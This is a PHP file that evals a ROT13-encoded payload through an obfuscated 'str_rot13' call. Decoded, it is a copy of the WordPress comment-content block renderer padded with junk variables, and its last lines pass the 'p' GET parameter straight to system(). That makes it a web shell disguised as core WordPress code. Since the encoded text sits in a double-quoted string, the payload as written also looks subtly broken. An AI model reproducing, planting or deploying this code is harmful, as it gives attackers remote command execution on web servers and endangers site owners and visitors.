<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/pbzzrag-pbagrag` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/pbzzrag-pbagrag` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 * @erghea fgevat Erghea gur cbfg pbzzrag'f pbagrag.
 */
shapgvba eraqre_oybpx_pber_pbzzrag_pbagrag( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( ! vffrg( $oybpx->pbagrkg['pbzzragVq'] ) ) {
		erghea '';
	}

	$pbzzrag            = trg_pbzzrag( $oybpx->pbagrkg['pbzzragVq'] );
	$pbzzragre          = jc_trg_pheerag_pbzzragre();
	$fubj_craqvat_yvaxf = vffrg( $pbzzragre['pbzzrag_nhgube'] ) && $pbzzragre['pbzzrag_nhgube'];
	vs ( rzcgl( $pbzzrag ) ) {
		erghea '';
	}

	$netf         = neenl();
	$pbzzrag_grkg = trg_pbzzrag_grkg( $pbzzrag, $netf );
	vs ( ! $pbzzrag_grkg ) {
		erghea '';
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pbzzrag-grzcyngr.cuc */
	$pbzzrag_grkg = nccyl_svygref( 'pbzzrag_grkg', $pbzzrag_grkg, $pbzzrag, $netf );

	$zbqrengvba_abgr = '';
	vs ( '0' === $pbzzrag->pbzzrag_nccebirq ) {
		$pbzzragre = jc_trg_pheerag_pbzzragre();

		vs ( $pbzzragre['pbzzrag_nhgube_rznvy'] ) {
			$zbqrengvba_abgr = __( 'Lbhe pbzzrag vf njnvgvat zbqrengvba.' );
		} ryfr {
			$zbqrengvba_abgr = __( 'Lbhe pbzzrag vf njnvgvat zbqrengvba. Guvf vf n cerivrj; lbhe pbzzrag jvyy or ivfvoyr nsgre vg unf orra nccebirq.' );
		}
		$zbqrengvba_abgr = '<c><rz pynff=\"pbzzrag-njnvgvat-zbqrengvba\">' . $zbqrengvba_abgr . '</rz></c>';
		vs ( ! $fubj_craqvat_yvaxf ) {
			$pbzzrag_grkg = jc_xfrf( $pbzzrag_grkg, neenl() );
		}
	}

	$pynffrf = neenl();
	vs ( vffrg( $nggevohgrf['grkgNyvta'] ) ) {
		$pynffrf[] = 'unf-grkg-nyvta-' . $nggevohgrf['grkgNyvta'];
	}
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffrf[] = 'unf-yvax-pbybe';
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffrf ) ) );

	erghea fcevags(
		'<qvi %1$f>%2$f%3$f</qvi>',
		$jenccre_nggevohgrf,
		$zbqrengvba_abgr,
		$pbzzrag_grkg
	);
}

/**
 * Ertvfgref gur `pber/pbzzrag-pbagrag` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_pbzzrag_pbagrag() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/pbzzrag-pbagrag',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_pbzzrag_pbagrag',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_pbzzrag_pbagrag' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>